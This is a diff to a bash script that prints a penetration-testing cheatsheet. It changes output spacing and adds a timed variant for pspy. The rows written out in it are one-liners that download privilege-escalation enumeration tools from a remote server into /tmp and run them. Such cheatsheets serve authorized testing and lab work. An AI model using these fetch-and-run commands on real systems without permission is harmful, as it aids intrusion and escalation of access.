@@ -54,8 +54,8 @@ sub() { echo -e "${YELLOW}# $*${NC}"; }
 # COMPACT MODE - one line per tool, cheatsheet table
 # ============================================================
 if [ "$COMPACT" -eq 1 ]; then
-    sec() { echo -e "\n${BOLD}${CYAN}--- $* ---${NC}"; }
-    row() { printf "${GREEN}%-11s${NC} %s\n" "$1" "$2"; }
+    sec() { echo -e "\n${BOLD}${CYAN}--- $* ---${NC}\n"; }
+    row() { printf "${GREEN}%-11s${NC} %s\n\n" "$1" "$2"; }
     # show <section_id> ... — runs the body only if the user asked for this section (or "all")
     show() {
         local id="$1"
@@ -92,7 +92,7 @@ if [ "$COMPACT" -eq 1 ]; then
     row "linpeas"    "wget $URL/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh"
     row "lse"        "wget $URL/linux/lse.sh -O /tmp/lse && chmod +x /tmp/lse && /tmp/lse -l2"
     row "les"        "wget $URL/linux/linux-exploit-suggester.sh -O /tmp/les && bash /tmp/les"
-    row "pspy"       "wget $URL/linux/pspy64 -O /tmp/p && chmod +x /tmp/p && /tmp/p   ${DIM}# cron/proc snoop${NC}"
+    row "pspy"       "wget $URL/linux/pspy64 -O /tmp/p && chmod +x /tmp/p && timeout 120 /tmp/p   ${DIM}# cron/proc snoop, auto-exit after 120s${NC}"
     fi
 
     if show windows; then
@@ -253,6 +253,10 @@ EOF
 )"
 
 section "pspy" "LINUX - pspy64 (proc snooper)" "$(cat <<EOF
+$(sub "auto-exit after 120s")
+wget $URL/linux/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && timeout 120 /tmp/pspy
+
+$(sub "run forever (CTRL+C to stop)")
 wget $URL/linux/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
 EOF
 )"
